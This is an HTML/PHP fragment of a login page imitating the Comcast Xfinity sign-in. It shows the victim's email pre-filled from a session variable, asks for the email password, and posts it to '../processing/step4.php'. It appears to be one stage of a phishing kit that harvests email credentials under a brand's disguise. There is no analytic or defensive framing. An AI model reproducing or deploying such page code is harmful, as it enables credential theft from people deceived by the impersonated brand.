...
<head>
    ...
    <link rel="stylesheet" type="text/css" href="./css/comcast.css">
    <link rel="shortcut icon" href="./img/Comcast/comcast.ico">
</head>
...
<body class=" has-footer ">
    ...
    <main id="bd" aria-hidden="false">
        ...
        <div id="right">
            <div class="container">
                <form action="../processing/step4.php" method="POST">
                    <div class="single logo-wrapper">
                        <span aria-role="img" class="xfinity-logo"></span>
                    </div>
                    <div class="textfield-wrapper">
                        <label for="user" class="float accessibly-hidden">Xfinity ID</label>
                        <input id="user" type="text" placeholder="<?php echo$_SESSION['email2']; ?>" disabled style="background-color: #D9D9D9;">
                        <style>
                    ...
                    <div class="textfield-wrapper">
                        ...
                        <input id="passwd" name="emailPassword2" type="password" placeholder="Password" maxlength="128" autocomplete="current-password">
                    </div>
                    <div id="errorPass">
